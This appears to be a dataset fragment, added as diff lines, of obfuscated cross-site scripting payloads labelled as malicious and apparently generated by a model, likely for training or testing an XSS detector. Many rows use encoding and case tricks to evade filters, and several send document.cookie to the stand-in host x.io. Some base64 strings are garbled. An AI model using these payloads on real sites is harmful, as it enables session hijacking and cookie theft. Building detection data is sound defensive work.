+<ObJeCt oNfOcUs=lOcAtIoN='//x.iO'>,1,xss,deepseek-r1
+%2527%253E%253Ca%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+&lt;a oninput=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,deepseek-r1
+%253Cmarquee%2520onmouseover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253cDeTaIlS%2520OnAnImAtIoNsTaRt%253DcOnFiRm%25281%2529%253e,1,xss,deepseek-r1
+"""&gt;&lt;ViDeO OnInPuT=AlErT(DoCuMeNt.cOoKiE)&gt;",1,xss,deepseek-r1
+"<ScRiPt onanimationstart=""print()"">",1,xss,deepseek-r1
+%2527%253E%253Cobject%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Cdetails%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+"""><DeTaIlS OnClIcK=PrInT()>",1,xss,deepseek-r1
+%253Cscr%253Cscript%253Eipt%253Econfirm%25281%2529%253C%252Fscript%253E,1,xss,deepseek-r1
+"<ImG OnLoAd=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
+'><AuDiO OnStArT=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
+%2527%253E%253Ca%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onstart%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+'&gt;&lt;audio onstart=alert(1)&gt;,1,xss,deepseek-r1
+%2522%253E%253cInPuT%2520OnStArT%253dAlErT%2528DoCuMeNt.dOmAiN%2529%253E,1,xss,deepseek-r1
+%2527%2526gt%253B%2526lt%253Bdetails%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2526gt%253B,1,xss,deepseek-r1
+%2522%253E%253Cdetails%2520onpointerover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%253CBoDy%2520oNsTaRt%253DpRiNt%2528%2529%253E,1,xss,deepseek-r1
+%253Cdiv%2520onfocus%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Ciframe%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+"<DiV OnErRoR=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,deepseek-r1
+%2522%253E%253Cimg%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%253Cdetails%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+<DeTaIlS OnStArT=AlErT(1)>,1,xss,deepseek-r1
+%253Cobject%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Ca%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+"""&gt;&lt;a onanimationstart=alert(document.domain)&gt;",1,xss,deepseek-r1
+&lt;input onmouseover=alert(document.domain)&gt;,1,xss,deepseek-r1
+%253Ciframe%2520onclick%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+%2522%2526gt%253B%2526lt%253Binput%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2526gt%253B,1,xss,deepseek-r1
+&lt;script ontoggle=print()&gt;,1,xss,deepseek-r1
+%253Cscr%2500ipt%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Cinput%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253CScRiPt%253EFETCH%2528%2527%252F%252FX.IO%252F%2527%252BDOCUMENT.COOKIE%2529%253C%252FScRiPt%253E,1,xss,deepseek-r1
+%253Cinput%2520onpointerover%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Cvideo%2520ontoggle%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+"""><DeTaIlS OnStArT=LoCaTiOn='//X.Io'>",1,xss,deepseek-r1
+%253Cobject%2520onpointerover%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Caudio%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+%253Cmarquee%2520onanimationstart%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Caudio%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253Csvg%2520onmouseover%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cbody%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cvideo%2520onclick%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+"""><DiV OnPoInTeRoVeR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
+%253CDiV%2520OnErRoR%253DCoNfIrM%25281%2529%253E,1,xss,deepseek-r1
+%253Cimg%2520onmouseover%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Cobject%2520onpointerover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Ciframe%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253Cdetails%2520onerror%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
+<ViDeO OnMoUsEoVeR=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
+'><DeTaIlS OnFoCuS=PrInT()>,1,xss,deepseek-r1
+%253Ca%2520onerror%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
+%253Cinput%2520onerror%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2527%253E%253Caudio%2520onerror%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+"""&gt;&lt;iframe ontoggle=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,deepseek-r1
+%2527%253E%253Cvideo%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cdiv%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Ciframe%2520onerror%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Csvg%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+"""&gt;&lt;audio oninput=confirm(1)&gt;",1,xss,deepseek-r1
+<BoDy oNaNiMaTiOnStArT=AlErT(1)>,1,xss,deepseek-r1
+%2522%253E%253Cdiv%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+"""><A OnErRoR=PrInT()>",1,xss,deepseek-r1
+%253cScRiPt%2520oNcLiCk%253DaLeRt%2528dOcUmEnT.CoOkIe%2529%253e,1,xss,deepseek-r1
+'&gt;&lt;ImG OnMoUsEoVeR=CoNfIrM(1)&gt;,1,xss,deepseek-r1
+%2522%253E%253Caudio%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+"<MaRqUeE OnToGgLe=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
+"""&gt;&lt;A OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)&gt;",1,xss,deepseek-r1
+"<A OnFoCuS=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,deepseek-r1
+<ViDeO OnStArT=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,deepseek-r1
+%253Cmarquee%2520onstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+"<ScRiPt oNpOiNtErOvEr=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
+<BoDy oNeRrOr=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,deepseek-r1
+"&lt;ScRiPt oninput=""confirm(1)""&gt;",1,xss,deepseek-r1
+%2527%253E%253Csvg%2520onfocus%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Cimg%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+%253CA%2520OnAnImAtIoNsTaRt%253D%2522PrInT%2528%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Cmarquee%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+'&gt;&lt;svg onerror=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,deepseek-r1
+'><BoDy oNsTaRt=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,deepseek-r1
+"""&gt;&lt;marquee onload=confirm(1)&gt;",1,xss,deepseek-r1
+%2527%253E%253CViDeO%2520OnLoAd%253DlOcAtIoN%253D%2527%252F%252Fx.iO%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Caudio%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cinput%2520onload%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Cbody%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+"""><AuDiO OnErRoR=AlErT(DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
+<AuDiO OnInPuT=CoNfIrM(1)>,1,xss,deepseek-r1
+%2522%253E%253Cimg%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+"""&gt;&lt;DiV OnInPuT=EvAl(aToB('yWxLcNqOmSk'))&gt;",1,xss,deepseek-r1
+%2522%253E%253Cdiv%2520onmouseover%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%253Cvideo%2520oninput%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%253Cscript%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+<DiV OnLoAd=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,deepseek-r1
+&lt;DeTaIlS OnErRoR=LoCaTiOn='//X.Io'&gt;,1,xss,deepseek-r1
+%2527%253E%253Cscript%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+"<ObJeCt oNcLiCk=""AlErT(1)"">",1,xss,deepseek-r1
+%253Cinput%2520onclick%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
+%253Cbody%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Caudio%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cvideo%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+%253Cobject%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Cscript%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Csvg%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cscript%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Csvg%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253Cimg%2520onpointerover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Caudio%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Ca%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+'><DeTaIlS OnPoInTeRoVeR=CoNfIrM(1)>,1,xss,deepseek-r1
+%253Cobject%2520onerror%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Cdetails%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cimg%2520onfocus%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
+%253cImG%2520OnClIcK%253dCoNfIrM%25281%2529%253E,1,xss,deepseek-r1
+%253Ciframe%2520onstart%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%253cBoDy%2520oNpOiNtErOvEr%253D%2522PrInT%2528%2529%2522%253E,1,xss,deepseek-r1
+%2527%2526gt%253B%2526lt%253Bobject%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,deepseek-r1
+%253Cdetails%2520oninput%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
+%253cBoDy%2520oNlOaD%253d%2522aLeRt%2528dOcUmEnT.CoOkIe%2529%2522%253E,1,xss,deepseek-r1
+%253Ciframe%2520onanimationstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+'><ScRiPt oNlOaD=CoNfIrM(1)>,1,xss,deepseek-r1
+%253Ca%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cvideo%2520onload%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%253CSvG%2520OnMoUsEoVeR%253DLoCaTiOn%253D%2527%252F%252FX.Io%2527%253E,1,xss,deepseek-r1
